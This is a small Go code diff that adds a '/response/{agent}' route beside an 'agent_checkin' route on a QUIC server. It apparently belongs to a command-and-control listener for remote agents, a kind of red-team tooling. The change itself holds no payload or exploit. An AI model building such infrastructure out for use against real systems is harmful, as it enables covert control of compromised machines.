@@ -35,6 +35,10 @@ func StartQuic(args []string) {
 		agent_checkin(w, r)
 	})
 
+	mux.HandleFunc("/response/{agent}", func(w http.ResponseWriter, r *http.Request) {
+		agent_response(w, r)
+	})
+
 	fmt.Printf("[+] Starting QUIC server on port %d\n", port)
 
 	err := http3.ListenAndServeQUIC(fmt.Sprintf(":%d", port), "server.crt", "server.key", mux)
